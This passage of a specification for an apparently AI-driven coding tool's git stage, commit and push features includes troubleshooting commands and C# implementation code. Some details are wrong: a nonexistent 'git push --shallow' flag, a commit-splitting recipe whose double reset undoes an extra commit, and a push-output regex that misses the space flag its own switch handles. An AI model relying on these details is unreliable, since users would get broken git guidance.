    }

    public void RequireAuthorization(ForcePushAnalysis analysis, PushOptions options)
    {
        if (!analysis.IsForceRequired)
            return; // Not a force push scenario

        // Force push MUST be explicitly authorized
        if (!options.Force && !options.ForceWithLease)
        {
            throw new UnauthorizedOperationException(
                "Force push detected but not authorized. Use --force or --force-with-lease.");
        }

        // Recommend --force-with-lease over --force
        if (options.Force && !options.ForceWithLease)
        {
            _logger.LogWarning("Using --force instead of safer --force-with-lease");
        }

        // Audit force push attempts
        _auditLogger.LogAuditEvent(new AuditEvent
        {
            EventType = "ForcePushAttempt",
            Severity = AuditSeverity.Warning,
            Message = $"Force push: {analysis.CommitsToBeOverwritten.Count} commits will be overwritten",
            Timestamp = DateTimeOffset.UtcNow
        });
    }
}
```

---

## Best Practices

### Staging (Add)

1. **Use pathspec carefully** - Verify what will be added before add
2. **Handle ignored files** - Don't add files matching .gitignore
3. **Support partial add** - Allow staging specific hunks
4. **Detect binary files** - Handle binary files appropriately

### Commit

5. **Validate message format** - Check against project conventions
6. **Include scope** - Message should reference task or area
7. **Atomic commits** - One logical change per commit
8. **Sign commits optionally** - Support GPG signing when configured

### Push

9. **Dry-run first** - Preview what would be pushed
10. **Handle rejection** - Explain fetch/rebase needed if rejected
11. **Respect mode restrictions** - No push in local-only or airgapped
12. **Retry on transient failure** - Network issues may be temporary

---

## Troubleshooting

### Issue 1: Push Rejected with "Non-Fast-Forward" Error

**Symptoms:**
- `PushAsync` throws PushRejectedException: "Updates were rejected because the remote contains work that you do not have"
- Error message: "! [rejected] main -> main (non-fast-forward)"
- Push succeeds locally but fails when sending to remote
- Git status shows "Your branch and 'origin/main' have diverged"
- Happens after pull request merged by another developer
- Also occurs when remote history was force-pushed

**Root Causes:**
1. **Remote has new commits** - Team member pushed commits after your last pull/fetch
2. **Diverged history** - Local branch has commits not in remote, remote has commits not in local
3. **Remote force-pushed** - Someone force-pushed, rewriting remote history
4. **Protected branch rules** - Remote repository enforces fast-forward-only merges
5. **Concurrent development** - Multiple developers pushing to same branch simultaneously
6. **Stale local branch** - Haven't pulled in weeks, remote significantly ahead

**Solutions:**

```bash
# Solution 1: Fetch and check divergence
git fetch origin
git log --oneline --graph --decorate --all
# Shows: Local branch (HEAD) and remote branch (origin/main) diverged

git log main..origin/main
# Shows: Commits in remote not in local
# Example output:
#   abc123 feat: implement feature Y (Jordan)
#   def456 fix: critical bug (Alex)

git log origin/main..main
# Shows: Commits in local not in remote
# Example output:
#   789xyz feat: implement feature X (You)

# Solution 2: Rebase local commits on top of remote (recommended)
git pull --rebase origin main
# Shows: Applying your commits on top of remote commits
# Expected output:
#   First, rewinding head to replay your work on top of it...
#   Applying: feat: implement feature X

# Resolve conflicts if any
git status
# Shows: Files with conflicts (if any)

# After resolving conflicts (edit files, then):
git add <resolved-files>
git rebase --continue

# Push rebased commits
acode git push
# Shows: Pushed successfully

# Solution 3: Merge remote commits into local (alternative)
git pull origin main
# Creates merge commit combining local and remote history

git log --oneline --graph -5
# Shows:
#   *   merge123 Merge remote-tracking branch 'origin/main'
#   |\
#   | * abc123 feat: implement feature Y (Jordan)
#   * | 789xyz feat: implement feature X (You)

acode git push
# Shows: Pushed successfully

# Solution 4: Force push with lease (DANGEROUS - only if you know what you're doing)
# Use when you intentionally want to overwrite remote history
git push --force-with-lease origin main
# Safer than --force, only succeeds if remote hasn't changed since last fetch
# Expected output:
#   + 789xyz...abc123 main -> main (forced update)

# Solution 5: Check branch protection rules
gh api repos/{owner}/{repo}/branches/main/protection
# Shows: Whether force-push is disabled, required reviews, etc.
```

### Issue 2: Commit Fails with "Nothing to Commit, Working Tree Clean"

**Symptoms:**
- `CommitAsync` throws NothingToCommitException
- Error: "nothing to commit, working tree clean"
- Agent reports no staged files
- Files were modified but commit fails
- Happens after calling StageAsync but before CommitAsync
- Git status shows "nothing to commit" despite visible changes

**Root Causes:**
1. **Files not staged** - Forgot to call `StageAsync` before `CommitAsync`
2. **Wrong working directory** - Staging/committing in different directory than files modified
3. **Gitignored files** - Modified files match .gitignore patterns
4. **Unstaged after staging** - Called `UnstageAsync` or `git reset` after staging
5. **Empty diff** - Changes were whitespace-only and `core.whitespace` settings ignore them
6. **Already committed** - Changes were already committed in previous operation

**Solutions:**

```bash
# Solution 1: Check what files were actually modified
git status --porcelain
# Shows: Status of all files
# Expected output examples:
#   M src/file.cs         (modified, not staged)
#   ?? src/newfile.cs     (untracked)
#   A src/staged.cs       (staged for commit)
#   (nothing)             (working tree clean)

# If shows modified files (M), stage them first
acode git add src/file.cs
git status
# Shows: Changes staged for commit

# Solution 2: Check if files are gitignored
git check-ignore -v src/file.cs
# If file is ignored, shows:
#   .gitignore:15:*.log    src/debug.log
# If not ignored, shows nothing

# Force add ignored file if needed
acode git add --force src/debug.log

# Solution 3: Check staging area vs working tree
git diff --stat
# Shows: Unstaged changes (working tree vs index)

git diff --cached --stat
# Shows: Staged changes (index vs HEAD)
# If empty, nothing staged for commit

# Solution 4: Verify working directory is correct
pwd
# Shows: /path/to/repo

git rev-parse --show-toplevel
# Shows: /path/to/repo (should match pwd)

# If mismatch, cd to correct directory
cd $(git rev-parse --show-toplevel)

# Solution 5: Check for whitespace-only changes
git diff --check
# Shows: Whitespace errors or nothing if only whitespace changed

# Stage and commit with --allow-empty if intentional
acode git commit "docs: update whitespace" --allow-empty

# Solution 6: Use --allow-empty for empty commits (checkpoint commits)
acode git commit "chore: checkpoint before refactor" --allow-empty
```

### Issue 3: Authentication Failure on Push with "Invalid Credentials"

**Symptoms:**
- `PushAsync` throws AuthenticationException: "Authentication failed"
- Error: "remote: Invalid username or password"
- HTTPS push fails with 401 Unauthorized
- SSH push fails with "Permission denied (publickey)"
- Credential helper prompts repeatedly
- Works locally but fails in CI/CD pipeline

**Root Causes:**
1. **Expired HTTPS token** - GitHub personal access token or GitLab token expired
2. **Token lacks permissions** - Token doesn't have push/write access to repository
3. **SSH key not loaded** - SSH agent not running or key not added
4. **Wrong SSH key** - Multiple SSH keys, using wrong one for this remote
5. **Credential helper misconfigured** - git-credential-cache timeout too short
6. **2FA enabled** - Repository requires two-factor authentication, token doesn't support it
7. **IP whitelist** - Remote server restricts access by IP address (relevant for corporate networks)

**Solutions:**

```bash
# Solution 1: Check credential helper configuration
git config --get credential.helper
# Shows: cache, store, manager-core, or nothing

# Configure credential helper to cache for 1 hour
git config --global credential.helper 'cache --timeout=3600'

# Or store credentials permanently (less secure)
git config --global credential.helper store

# Solution 2: Clear cached credentials and re-enter
git credential reject <<EOF
protocol=https
host=github.com
EOF
# Shows: (no output, credentials cleared)

# Next push will prompt for credentials
acode git push
# Prompts: Username: <your-username>
#          Password: <your-token> (NOT your GitHub password!)

# Solution 3: Check HTTPS token permissions (GitHub)
curl -H "Authorization: token YOUR_TOKEN" https://api.github.com/user/repos
# Shows: List of repositories you have access to
# If 401, token is invalid
# If 403, token lacks permissions

# Regenerate token with correct scopes at:
# GitHub: Settings → Developer settings → Personal access tokens
# Required scopes: repo (full control of private repositories)

# Solution 4: SSH authentication - check SSH agent
ssh-add -l
# Shows: List of loaded SSH keys, or "The agent has no identities" if empty

# Start SSH agent if not running
eval "$(ssh-agent -s)"
# Shows: Agent pid 12345

# Add SSH key
ssh-add ~/.ssh/id_ed25519
# Shows: Identity added: /home/user/.ssh/id_ed25519

# Test SSH connection
ssh -T git@github.com
# Expected output:
#   Hi username! You've successfully authenticated, but GitHub does not provide shell access.

# Solution 5: SSH key mismatch - specify correct key
# Check which key remote expects
ssh -T git@github.com -i ~/.ssh/id_rsa_github
# Or configure in ~/.ssh/config:
cat >> ~/.ssh/config <<EOF
Host github.com
  IdentityFile ~/.ssh/id_ed25519_github
  IdentitiesOnly yes
EOF

# Solution 6: Switch from HTTPS to SSH (or vice versa)
git remote get-url origin
# Shows: https://github.com/user/repo.git (HTTPS)

# Change to SSH
git remote set-url origin git@github.com:user/repo.git

# Or change to HTTPS
git remote set-url origin https://github.com/user/repo.git
```

### Issue 4: Large File Push Fails with "RPC Failed" or Timeout

**Symptoms:**
- `PushAsync` throws timeout exception after 60 seconds
- Error: "error: RPC failed; HTTP 500 curl 22 The requested URL returned error: 500"
- Error: "fatal: the remote end hung up unexpectedly"
- Push hangs at "Writing objects: 100%" then fails
- Happens with commits containing large files (>50MB)
- Works for small changes but fails for large refactors
- Slower network connections affected more

**Root Causes:**
1. **Large file size** - Single file >50MB exceeds GitHub/GitLab limits without LFS
2. **HTTP buffer too small** - Git's HTTP post buffer insufficient for large push
3. **Network timeout** - Slow connection can't complete push within timeout
4. **Server-side limits** - Remote repository has size limits per push
5. **Compression overhead** - Many binary files slow down compression
6. **Weak connection** - Intermittent packet loss causes retry failures

**Solutions:**

```bash
# Solution 1: Increase Git HTTP buffer size
git config --global http.postBuffer 524288000
# Sets buffer to 500MB (default is 1MB)

# Verify configuration
git config --get http.postBuffer
# Shows: 524288000

# Solution 2: Increase push timeout in GitService
# In .agent/config.yml:
# git:
#   timeoutSeconds: 300  # 5 minutes instead of default 60s

# Or via environment variable
export GIT_PUSH_TIMEOUT=300
acode git push

# Solution 3: Use Git LFS for large files
# Install Git LFS
git lfs install

# Track large file types
git lfs track "*.psd"
git lfs track "*.zip"
git lfs track "*.bin"

# Add .gitattributes
git add .gitattributes

# Migrate existing large files to LFS
git lfs migrate import --include="*.psd,*.zip" --everything

# Push with LFS
acode git push

# Solution 4: Split large commits into smaller ones
# If commit has 100 files totaling 200MB, split into multiple commits

# Commit first batch
git reset --soft HEAD~1  # Unstage last commit
git reset HEAD~1         # Unstage files

git add src/batch1/
git commit -m "feat: part 1 of large refactor"
acode git push

# Commit second batch
git add src/batch2/
git commit -m "feat: part 2 of large refactor"
acode git push

# Solution 5: Use shallow push (if supported by remote)
# Push only recent commits, not entire history
git push --shallow origin main

# Solution 6: Check network connectivity and retry
ping -c 4 github.com
# Shows: Packet loss percentage
# If >5% packet loss, network is unstable

# Use --verbose to see push progress
GIT_TRACE=1 GIT_CURL_VERBOSE=1 git push origin main
# Shows: Detailed network activity

# Retry push with exponential backoff (implemented in PushRetryPolicy)
acode git push  # Automatically retries on transient failures
```

### Issue 5: Mode Violation Error "Push Blocked by Local-Only Mode"

**Symptoms:**
- `PushAsync` throws ModeViolationException: "Push blocked by local-only mode"
- Error: "Network operations are not permitted in LocalOnly mode"
- Commit succeeds but push fails immediately
- Happens in restricted environments (CI/CD, airgapped deployments)
- No network access despite having internet connectivity
- Mode setting doesn't match intended usage

**Root Causes:**
1. **Operating mode misconfigured** - `.agent/config.yml` set to LocalOnly when should be Burst
2. **Security policy** - Organization enforces LocalOnly for compliance (ITAR, EAR)
3. **Environment detection** - Auto-detection chose wrong mode based on environment variables
4. **Stale configuration** - Config file not updated after infrastructure changes
5. **Override not applied** - Command-line --mode flag not working
6. **Intentional restriction** - System admin locked mode to prevent data exfiltration

**Solutions:**

```bash
# Solution 1: Check current operating mode
acode config get mode
# Shows: LocalOnly, Burst, or Airgapped

# Solution 2: Change mode to Burst (if allowed)
acode config set mode burst
# Shows: Operating mode set to Burst

# Verify change
acode config get mode
# Shows: Burst

# Solution 3: Check config file directly
cat .agent/config.yml
# Shows:
#   operatingMode: LocalOnly
#   allowNetworkOperations: false

# Edit config file
nano .agent/config.yml
# Change: operatingMode: Burst
#         allowNetworkOperations: true

# Solution 4: Override mode for single operation (if supported)
acode --mode=burst git push
# Temporarily allows push in Burst mode

# Solution 5: Check if mode is locked by policy
acode config get modeLocked
# Shows: true (mode cannot be changed) or false

# If locked, contact system administrator
# Policy file location: /etc/acode/policy.yml

# Solution 6: Use offline workflow in LocalOnly mode
# Work locally, then export/import changes via USB/sneakernet

# Export commits as patch files
git format-patch origin/main..HEAD
# Shows: 0001-feat-implement-feature.patch
#        0002-fix-bug.patch

# Transfer patches to system with network access

# On networked system, apply patches
git am *.patch
acode git push

# Solution 7: Verify network is actually needed
# Check if remote is local bare repository
git remote get-url origin
# If shows: /path/to/local/bare/repo.git
# Then push doesn't require network, mode enforcement may be bug

# Report issue to support with:
acode diagnostics --include-mode-info
```

---

## Testing Requirements

### Unit Tests

- [ ] UT-001: Test staging path handling
- [ ] UT-002: Test glob expansion
- [ ] UT-003: Test commit message validation
- [ ] UT-004: Test mode checking
- [ ] UT-005: Test retry logic

### Integration Tests

- [ ] IT-001: Stage on real repo
- [ ] IT-002: Commit on real repo
- [ ] IT-003: Push to local bare repo
- [ ] IT-004: Auth failure handling
- [ ] IT-005: Mode blocking

### End-to-End Tests

- [ ] E2E-001: CLI add command
- [ ] E2E-002: CLI commit command
- [ ] E2E-003: CLI push (burst mode)
- [ ] E2E-004: Mode violation error

### Performance/Benchmarks

- [ ] PB-001: Stage 1000 files in <500ms
- [ ] PB-002: Commit in <1s
- [ ] PB-003: Push small change in <5s

---

## Implementation Prompt

### File Structure

```
src/
├── Acode.Domain/
│   └── Git/
│       ├── GitCommit.cs
│       ├── PushResult.cs
│       └── StageResult.cs
├── Acode.Application/
│   └── Git/
│       ├── Options/
│       │   ├── StageOptions.cs
│       │   ├── CommitOptions.cs
│       │   └── PushOptions.cs
│       └── Exceptions/
│           ├── NothingToCommitException.cs
│           ├── AuthenticationException.cs
│           ├── PushRejectedException.cs
│           └── ModeViolationException.cs
├── Acode.Infrastructure/
│   └── Git/
│       ├── GitService.Stage.cs
│       ├── GitService.Commit.cs
│       ├── GitService.Push.cs
│       └── PushRetryPolicy.cs
└── Acode.Cli/
    └── Commands/
        └── Git/
            ├── GitAddCommand.cs
            ├── GitCommitCommand.cs
            └── GitPushCommand.cs
```

### Domain Models

```csharp
// PushResult.cs
namespace Acode.Domain.Git;

public sealed record PushResult
{
    public required bool Success { get; init; }
    public required string Remote { get; init; }
    public required string Branch { get; init; }
    public required IReadOnlyList<RefUpdate> RefUpdates { get; init; }
    public TimeSpan Duration { get; init; }
}

public sealed record RefUpdate
{
    public required string RefName { get; init; }
    public required string OldSha { get; init; }
    public required string NewSha { get; init; }
    public required RefUpdateStatus Status { get; init; }
}

public enum RefUpdateStatus
{
    Updated,
    Created,
    Deleted,
    Rejected,
    UpToDate
}

// StageResult.cs
public sealed record StageResult
{
    public required int FilesStaged { get; init; }
    public required IReadOnlyList<string> StagedPaths { get; init; }
    public IReadOnlyList<string> Warnings { get; init; } = Array.Empty<string>();
}
```

### Options Classes

```csharp
// StageOptions.cs
namespace Acode.Application.Git.Options;

public sealed record StageOptions
{
    public bool All { get; init; }
    public bool Force { get; init; }
    public bool DryRun { get; init; }
}

// CommitOptions.cs
public sealed record CommitOptions
{
    public bool AllowEmpty { get; init; }
    public bool Amend { get; init; }
    public string? Author { get; init; }
    public DateTimeOffset? Date { get; init; }
    public bool NoVerify { get; init; }
}

// PushOptions.cs
public sealed record PushOptions
{
    public string? Remote { get; init; }
    public string? Branch { get; init; }
    public bool SetUpstream { get; init; }
    public bool Force { get; init; }
    public bool ForceWithLease { get; init; }
    public bool DryRun { get; init; }
    public IProgress<PushProgress>? Progress { get; init; }
}

public sealed record PushProgress
{
    public required string Phase { get; init; }
    public int? Current { get; init; }
    public int? Total { get; init; }
}
```

### Service Implementation

```csharp
// GitService.Stage.cs
namespace Acode.Infrastructure.Git;

public partial class GitService
{
    public async Task<StageResult> StageAsync(
        string workingDir, 
        IEnumerable<string> paths,
        StageOptions? options = null,
        CancellationToken ct = default)
    {
        options ??= new StageOptions();
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        var pathList = paths.ToList();
        
        var args = new List<string> { "add" };
        
        if (options.All)
        {
            args.Add("--all");
        }
        
        if (options.Force)
        {
            args.Add("--force");
        }
        
        if (options.DryRun)
        {
            args.Add("--dry-run");
        }
        
        args.Add("--");
        args.AddRange(pathList.Count > 0 ? pathList : new[] { "." });
        
        await ExecuteGitAsync(workingDir, args, ct);
        
        // Get what was staged
        var status = await GetStatusAsync(workingDir, ct);
        
        _logger.LogInformation("Staged {Count} files", status.StagedFiles.Count);
        
        return new StageResult
        {
            FilesStaged = status.StagedFiles.Count,
            StagedPaths = status.StagedFiles.Select(f => f.Path).ToList()
        };
    }
    
    public async Task UnstageAsync(
        string workingDir, 
        IEnumerable<string> paths,
        CancellationToken ct = default)
    {
        await EnsureRepositoryAsync(workingDir, ct);
        
        var pathList = paths.ToList();
        
        var args = new List<string> { "reset", "HEAD", "--" };
        args.AddRange(pathList);
        
        await ExecuteGitAsync(workingDir, args, ct);
        
        _logger.LogInformation("Unstaged {Count} paths", pathList.Count);
    }
}

// GitService.Commit.cs
public partial class GitService
{
    public async Task<GitCommit> CommitAsync(
        string workingDir, 
        string message,
        CommitOptions? options = null,
        CancellationToken ct = default)
    {
        options ??= new CommitOptions();
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        // Validate message
        if (string.IsNullOrWhiteSpace(message))
        {
            throw new ArgumentException("Commit message cannot be empty", nameof(message));
        }
        
        // Check for staged changes (unless allow-empty or amend)
        if (!options.AllowEmpty && !options.Amend)
        {
            var status = await GetStatusAsync(workingDir, ct);
            if (status.StagedFiles.Count == 0)
            {
                throw new NothingToCommitException(workingDir);
            }
        }
        
        var args = new List<string> { "commit", "-m", message };
        
        if (options.AllowEmpty)
        {
            args.Add("--allow-empty");
        }
        
        if (options.Amend)
        {
            args.Add("--amend");
        }
        
        if (options.NoVerify)
        {
            args.Add("--no-verify");
        }
        
        if (options.Author is not null)
        {
            args.Add($"--author={options.Author}");
        }
        
        if (options.Date.HasValue)
        {
            args.Add($"--date={options.Date.Value:o}");
        }
        
        await ExecuteGitAsync(workingDir, args, ct);
        
        // Get the commit we just created
        var log = await GetLogAsync(workingDir, new LogOptions { Limit = 1 }, ct);
        var commit = log.First();
        
        _logger.LogInformation("Created commit {Sha}: {Message}", commit.ShortSha, message);
        
        return commit;
    }
}

// GitService.Push.cs
public partial class GitService
{
    private readonly PushRetryPolicy _pushRetryPolicy;
    
    public async Task<PushResult> PushAsync(
        string workingDir,
        PushOptions? options = null,
        CancellationToken ct = default)
    {
        options ??= new PushOptions();
        var stopwatch = Stopwatch.StartNew();
        
        // Mode check - push is network operation
        var mode = await _modeResolver.GetCurrentModeAsync(ct);
        if (mode is OperatingMode.LocalOnly)
        {
            _logger.LogWarning("Push blocked by local-only mode");
            throw new ModeViolationException(mode.ToString(), "push");
        }
        
        if (mode is OperatingMode.Airgapped)
        {
            _logger.LogWarning("Push blocked by airgapped mode");
            throw new ModeViolationException(mode.ToString(), "push");
        }
        
        await EnsureRepositoryAsync(workingDir, ct);
        
        var remote = options.Remote ?? "origin";
        var branch = options.Branch ?? await GetCurrentBranchAsync(workingDir, ct);
        
        var args = new List<string> { "push" };
        
        if (options.SetUpstream)
        {
            args.Add("--set-upstream");
        }
        
        if (options.ForceWithLease)
        {
            args.Add("--force-with-lease");
        }
        else if (options.Force)
        {
            args.Add("--force");
        }
        
        if (options.DryRun)
        {
            args.Add("--dry-run");
        }
        
        args.Add("--porcelain");
        args.Add(remote);
        args.Add(branch);
        
        // Execute with retry
        CommandResult result;
        try
        {
            result = await _pushRetryPolicy.ExecuteWithRetryAsync(
                async () => await ExecuteGitAsync(workingDir, args, ct,
                    timeout: TimeSpan.FromSeconds(_config.Value.TimeoutSeconds)),
                ct);
        }
        catch (GitException ex) when (ex.StdErr?.Contains("Authentication failed") == true)
        {
            throw new AuthenticationException(_redactor.Redact(ex.StdErr ?? ""), workingDir);
        }
        catch (GitException ex) when (ex.StdErr?.Contains("rejected") == true)
        {
            throw new PushRejectedException(_redactor.Redact(ex.StdErr ?? ""), workingDir);
        }
        
        var refUpdates = ParsePushOutput(result.StdOut);
        
        _logger.LogInformation("Pushed {Branch} to {Remote}", branch, remote);
        
        return new PushResult
        {
            Success = true,
            Remote = remote,
            Branch = branch,
            RefUpdates = refUpdates,
            Duration = stopwatch.Elapsed
        };
    }
    
    private IReadOnlyList<RefUpdate> ParsePushOutput(string output)
    {
        var updates = new List<RefUpdate>();
        
        foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            // Porcelain format: <flag>\t<from>:<to>\t<summary> (<reason>)
            var match = Regex.Match(line, @"^([!=\*-+])\t([^:]+):([^\t]+)\t(.*)$");
            if (match.Success)
            {
                var flag = match.Groups[1].Value[0];
                var fromRef = match.Groups[2].Value;
                var toRef = match.Groups[3].Value;
                
                updates.Add(new RefUpdate
                {
                    RefName = toRef,
                    OldSha = "", // Would need additional parsing
                    NewSha = "",
                    Status = flag switch
                    {
                        ' ' => RefUpdateStatus.Updated,
                        '*' => RefUpdateStatus.Created,
                        '-' => RefUpdateStatus.Deleted,
                        '!' => RefUpdateStatus.Rejected,
                        '=' => RefUpdateStatus.UpToDate,
                        _ => RefUpdateStatus.Updated
                    }
                });
            }
        }
        
        return updates;
    }
}

// PushRetryPolicy.cs
namespace Acode.Infrastructure.Git;

public sealed class PushRetryPolicy
{
    private readonly IOptions<GitConfiguration> _config;
    private readonly ILogger<PushRetryPolicy> _logger;
    
    public async Task<CommandResult> ExecuteWithRetryAsync(
        Func<Task<CommandResult>> operation,
        CancellationToken ct)
    {
        var maxRetries = _config.Value.RetryCount;
        var baseDelay = TimeSpan.FromMilliseconds(_config.Value.RetryDelayMs);
        
        for (var attempt = 0; attempt <= maxRetries; attempt++)
        {
            try
            {
                return await operation();
            }
            catch (GitException ex) when (IsRetryable(ex) && attempt < maxRetries)
            {
                var delay = baseDelay * Math.Pow(2, attempt);
                _logger.LogWarning(
                    "Push attempt {Attempt} failed, retrying in {Delay}ms: {Error}",
                    attempt + 1, delay.TotalMilliseconds, ex.Message);
                
                await Task.Delay(delay, ct);
            }
        }
        
        throw new InvalidOperationException("Retry exhausted");
    }
    
    private static bool IsRetryable(GitException ex)
    {
        var stderr = ex.StdErr ?? "";
        return stderr.Contains("Could not resolve host") ||
               stderr.Contains("Connection refused") ||
               stderr.Contains("Connection timed out") ||
               stderr.Contains("temporarily unavailable");
    }
}
```

### CLI Commands

```csharp
// GitAddCommand.cs
namespace Acode.Cli.Commands.Git;

[Command("git add", Description = "Stage files")]
public class GitAddCommand
{
    [Argument(0, Description = "Paths to stage")]
    public string[] Paths { get; set; } = Array.Empty<string>();
    
    [Option("--all", Description = "Stage all changes")]
    public bool All { get; set; }
    
    [Option("--force", Description = "Stage ignored files")]
    public bool Force { get; set; }
    
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        var cwd = Directory.GetCurrentDirectory();
        
        var result = await git.StageAsync(cwd, Paths, new StageOptions
        {
            All = All,
            Force = Force
        }, ct);
        
        console.WriteLine($"✓ Staged {result.FilesStaged} files");
        return 0;
    }
}

// GitCommitCommand.cs
[Command("git commit", Description = "Create commit")]
public class GitCommitCommand
{
    [Argument(0, Description = "Commit message")]
    public string Message { get; set; } = "";
    
    [Option("--amend", Description = "Amend last commit")]
    public bool Amend { get; set; }
    
    [Option("--allow-empty", Description = "Allow empty commit")]
    public bool AllowEmpty { get; set; }
    
    [Option("--author", Description = "Override author")]
    public string? Author { get; set; }
    
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        var cwd = Directory.GetCurrentDirectory();
        
        var commit = await git.CommitAsync(cwd, Message, new CommitOptions
        {
            Amend = Amend,
            AllowEmpty = AllowEmpty,
            Author = Author
        }, ct);
        
        console.WriteLine($"✓ [{commit.ShortSha}] {Message}");
        return 0;
    }
}

// GitPushCommand.cs
[Command("git push", Description = "Push to remote")]
public class GitPushCommand
{
    [Option("--remote", Description = "Remote name")]
    public string? Remote { get; set; }
    
    [Option("--branch", Description = "Branch to push")]
    public string? Branch { get; set; }
    
    [Option("--set-upstream", Description = "Set upstream tracking")]
    public bool SetUpstream { get; set; }
    
    [Option("--force", Description = "Force push (DANGEROUS)")]
    public bool Force { get; set; }
    
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        var cwd = Directory.GetCurrentDirectory();
        
        if (Force)
        {
            console.Error.WriteLine("⚠ WARNING: Force push may overwrite remote history");
        }
        
        try
        {
            var result = await git.PushAsync(cwd, new PushOptions
            {
                Remote = Remote,
                Branch = Branch,
                SetUpstream = SetUpstream,
                Force = Force
            }, ct);
            
            console.WriteLine($"✓ Pushed to {result.Remote}/{result.Branch}");
            return 0;
        }
        catch (ModeViolationException ex)
        {
            console.Error.WriteLine($"✗ Push blocked by {ex.CurrentMode} mode");
            console.Error.WriteLine("  Switch to burst mode to enable push");
            return 3;
        }
        catch (AuthenticationException)
        {
            console.Error.WriteLine("✗ Authentication failed");
            console.Error.WriteLine("  Configure credentials: git config credential.helper store");
            return 4;
        }
        catch (PushRejectedException ex)
        {
            console.Error.WriteLine($"✗ Push rejected: {ex.Message}");
            console.Error.WriteLine("  Pull changes first: acode git pull");
            return 5;
        }
    }
}
```

### Error Codes

| Code | Name | Description | Recovery |
|------|------|-------------|----------|
| GIT-022C-001 | NothingToCommit | No staged changes | Stage files first |
| GIT-022C-002 | EmptyMessage | Commit message empty | Provide message |
| GIT-022C-003 | AuthFailed | Authentication failed | Configure credentials |
| GIT-022C-004 | NetworkError | Network unreachable | Check connectivity |
| GIT-022C-005 | PushRejected | Remote rejected push | Pull first |
| GIT-022C-006 | ModeBlocked | Operation blocked by mode | Switch to burst mode |
| GIT-022C-007 | Timeout | Push timed out | Increase timeout |

### Implementation Checklist

- [ ] Implement StageAsync with path handling
- [ ] Implement UnstageAsync
- [ ] Implement CommitAsync with validation
- [ ] Implement PushAsync with mode check
- [ ] Implement PushRetryPolicy with backoff
- [ ] Add credential redaction
- [ ] Implement CLI add command
- [ ] Implement CLI commit command
- [ ] Implement CLI push command
- [ ] Add unit tests for retry logic
- [ ] Add integration tests with real repos
- [ ] Add E2E tests for CLI commands
- [ ] Run performance benchmarks

### Rollout Plan

| Phase | Action | Validation |
|-------|--------|------------|
| 1 | Implement StageAsync | Stage tests pass |
| 2 | Implement CommitAsync | Commit tests pass |
| 3 | Implement PushRetryPolicy | Retry tests pass |
| 4 | Implement PushAsync | Push tests pass |
| 5 | Add mode validation | Mode tests pass |
| 6 | Add CLI commands | E2E tests pass |
| 7 | Performance testing | Benchmarks pass |

---

**End of Task 022.c Specification**